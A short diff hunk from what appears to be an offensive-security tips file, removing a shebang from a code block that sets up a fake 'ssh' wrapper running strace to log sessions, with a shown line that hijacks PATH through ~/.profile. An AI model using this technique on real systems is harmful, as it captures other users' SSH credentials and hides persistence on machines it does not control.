@@ -685,7 +685,6 @@ Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strac
 Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
 ```
 # Cut & Paste the following into a bash shell:
-#! /bin/bash
 # Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
 echo 'PATH=~/.local/bin:$PATH #0xFD0E' >>~/.profile
 
